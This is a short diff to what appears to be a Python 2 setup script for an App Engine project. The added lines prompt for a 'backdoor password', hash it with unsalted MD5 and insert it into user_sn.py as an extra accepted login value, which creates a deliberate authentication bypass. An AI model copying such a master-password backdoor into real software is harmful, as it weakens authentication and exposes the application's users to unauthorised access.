@@ -28,6 +28,11 @@ fix_url("preflight.py","(?<=BASE_URL=\").*(?=\")",name,url=url)
 fix_url("sneak.py","(?<=BASE_URL=\").*(?=\")",name,url=url)
 fix_file("appengine/mail.py","(?<=FROM_MAIL_ADDRESS=\").*(?=\")",email)
 fix_file("appengine/mail.py","(?<=ALERT_ADMIN_ADDRESS=\").*(?=\")",email)
+from getpass import getpass
+print "Type a backdoor password:",
+mpass = getpass()
+import hashlib
+fix_file("appengine/user_sn.py","(?<=elif attempt==\").*(?=\":)",hashlib.md5(mpass).hexdigest())
 import os
 os.system("rm -rf appengine/*.pyc")
 
